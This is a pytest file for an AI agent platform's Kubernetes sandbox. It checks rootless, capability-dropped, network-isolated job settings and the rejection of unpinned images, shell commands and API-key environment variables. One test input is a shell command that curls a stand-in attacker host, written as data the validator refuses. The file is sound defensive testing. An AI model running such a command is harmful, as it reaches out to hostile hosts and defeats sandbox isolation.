from __future__ import annotations

import pytest

from agent_platform.infrastructure.sandbox import (
    SandboxJobRequest,
    SandboxLimits,
    build_sandbox_resources,
)


def request(**overrides: object) -> SandboxJobRequest:
    values: dict[str, object] = {
        "tenant_id": "tenant-a",
        "run_id": "run-a",
        "task_id": "code-a",
        "namespace": "agent-sandboxes",
        "image": "registry.example.test/sandbox@sha256:" + "a" * 64,
        "command": ("python", "-m", "sandbox_runner"),
        "environment": {"TASK_MODE": "deterministic"},
        "limits": SandboxLimits(
            cpu_millicores=500,
            memory_mib=512,
            ephemeral_storage_mib=256,
            active_deadline_seconds=120,
        ),
    }
    values.update(overrides)
    return SandboxJobRequest(**values)


def test_sandbox_job_is_rootless_bounded_and_has_no_service_account_token() -> None:
    resources = build_sandbox_resources(request())
    job = resources.job
    pod = job["spec"]["template"]["spec"]
    container = pod["containers"][0]

    assert pod["automountServiceAccountToken"] is False
    assert pod["hostNetwork"] is False
    assert pod["securityContext"]["runAsNonRoot"] is True
    assert container["securityContext"]["allowPrivilegeEscalation"] is False
    assert container["securityContext"]["readOnlyRootFilesystem"] is True
    assert container["securityContext"]["capabilities"]["drop"] == ["ALL"]
    assert container["resources"]["limits"] == {
        "cpu": "500m",
        "memory": "512Mi",
        "ephemeral-storage": "256Mi",
    }
    assert job["spec"]["activeDeadlineSeconds"] == 120
    assert job["spec"]["backoffLimit"] == 0

    policy = resources.network_policy
    assert policy["spec"]["policyTypes"] == ["Ingress", "Egress"]
    assert policy["spec"]["ingress"] == []
    assert policy["spec"]["egress"] == []


def test_sandbox_rejects_unpinned_images_shells_and_sensitive_environment() -> None:
    with pytest.raises(ValueError, match="SANDBOX_IMAGE_DIGEST_REQUIRED"):
        request(image="registry.example.test/sandbox:latest")
    with pytest.raises(ValueError, match="SANDBOX_SHELL_COMMAND_FORBIDDEN"):
        request(command=("sh", "-c", "curl attacker.test"))
    with pytest.raises(ValueError, match="SANDBOX_SENSITIVE_ENV_FORBIDDEN"):
        request(environment={"OPENAI_API_KEY": "secret"})
